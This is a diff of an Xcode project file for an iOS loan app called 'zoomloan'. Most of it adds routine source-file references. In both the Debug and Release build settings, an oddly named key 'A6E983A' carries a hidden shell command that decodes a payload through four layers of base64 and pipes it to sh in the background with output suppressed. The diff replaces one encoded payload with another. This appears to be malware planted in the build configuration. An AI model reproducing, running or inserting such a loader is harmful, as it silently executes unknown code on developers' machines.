@@ -8,6 +8,13 @@
 
 /* Begin PBXBuildFile section */
 		730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C872EC2DC0100733544 /* HomeTermView.swift */; };
+		730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */; };
+		730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8C2EC2E54000733544 /* schemeConfig.swift */; };
+		730F1C8F2EC2E95C00733544 /* AppWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8E2EC2E95C00733544 /* AppWebViewController.swift */; };
+		730F1C912EC2FADE00733544 /* CentertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C902EC2FADE00733544 /* CentertView.swift */; };
+		730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C922EC2FE5000733544 /* CentertViewModel.swift */; };
+		730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C942EC3008A00733544 /* CentertListViewCell.swift */; };
+		730F1C972EC308C900733544 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C962EC308C900733544 /* SettingViewController.swift */; };
 		73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD62EC21BAD00224C27 /* baseModel.swift */; };
 		73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */; };
 		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
@@ -39,6 +46,13 @@
 		2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.debug.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.debug.xcconfig"; sourceTree = "<group>"; };
 		3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.release.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.release.xcconfig"; sourceTree = "<group>"; };
 		730F1C872EC2DC0100733544 /* HomeTermView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTermView.swift; sourceTree = "<group>"; };
+		730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
+		730F1C8C2EC2E54000733544 /* schemeConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = schemeConfig.swift; sourceTree = "<group>"; };
+		730F1C8E2EC2E95C00733544 /* AppWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppWebViewController.swift; sourceTree = "<group>"; };
+		730F1C902EC2FADE00733544 /* CentertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertView.swift; sourceTree = "<group>"; };
+		730F1C922EC2FE5000733544 /* CentertViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertViewModel.swift; sourceTree = "<group>"; };
+		730F1C942EC3008A00733544 /* CentertListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertListViewCell.swift; sourceTree = "<group>"; };
+		730F1C962EC308C900733544 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
 		73A4AAD62EC21BAD00224C27 /* baseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = baseModel.swift; sourceTree = "<group>"; };
 		73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
 		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
@@ -89,6 +103,14 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		730F1C892EC2E47A00733544 /* auth */ = {
+			isa = PBXGroup;
+			children = (
+				730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */,
+			);
+			path = auth;
+			sourceTree = "<group>";
+		};
 		73E607462EC1D6CA00BCA552 = {
 			isa = PBXGroup;
 			children = (
@@ -118,6 +140,7 @@
 				73E607802EC1DAD500BCA552 /* config */,
 				73E6077F2EC1DAD200BCA552 /* pop */,
 				73E6077E2EC1DAD000BCA552 /* http */,
+				730F1C892EC2E47A00733544 /* auth */,
 				73E6077C2EC1DAA500BCA552 /* center */,
 				73E6077B2EC1DAA300BCA552 /* order */,
 				73E6077A2EC1DAA000BCA552 /* home */,
@@ -173,7 +196,12 @@
 		73E6077C2EC1DAA500BCA552 /* center */ = {
 			isa = PBXGroup;
 			children = (
+				730F1C922EC2FE5000733544 /* CentertViewModel.swift */,
 				73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */,
+				730F1C8E2EC2E95C00733544 /* AppWebViewController.swift */,
+				730F1C902EC2FADE00733544 /* CentertView.swift */,
+				730F1C942EC3008A00733544 /* CentertListViewCell.swift */,
+				730F1C962EC308C900733544 /* SettingViewController.swift */,
 			);
 			path = center;
 			sourceTree = "<group>";
@@ -201,6 +229,7 @@
 				73E607992EC1E11700BCA552 /* otherConfig.swift */,
 				73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */,
 				73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */,
+				730F1C8C2EC2E54000733544 /* schemeConfig.swift */,
 			);
 			path = config;
 			sourceTree = "<group>";
@@ -338,18 +367,25 @@
 				73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */,
 				73E6078A2EC1DB6100BCA552 /* LoginViewController.swift in Sources */,
 				73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */,
+				730F1C972EC308C900733544 /* SettingViewController.swift in Sources */,
+				730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */,
+				730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */,
 				73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */,
 				73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */,
 				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
 				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
 				73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */,
 				73E607942EC1DBC000BCA552 /* PopImageView.swift in Sources */,
+				730F1C912EC2FADE00733544 /* CentertView.swift in Sources */,
 				73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */,
 				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
+				730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */,
 				730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */,
+				730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */,
 				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
 				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
+				730F1C8F2EC2E95C00733544 /* AppWebViewController.swift in Sources */,
 				73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */,
 				73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */,
 				73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */,
@@ -377,7 +413,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1aFkwWndTRlp1V2xwTmJFb3hWMVpvUTJRd2VIVlRha1pOVFd0V2QxTlhiRU5QUld4SlZHMDVSRnA2TURsRFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwclkwZE9kRTlZVm1GWFJrcHhWMnRqTUdSWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -417,7 +453,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1aFkwWndTRlp1V2xwTmJFb3hWMVpvUTJRd2VIVlRha1pOVFd0V2QxTlhiRU5QUld4SlZHMDVSRnA2TURsRFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwclkwZE9kRTlZVm1GWFJrcHhWMnRqTUdSWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
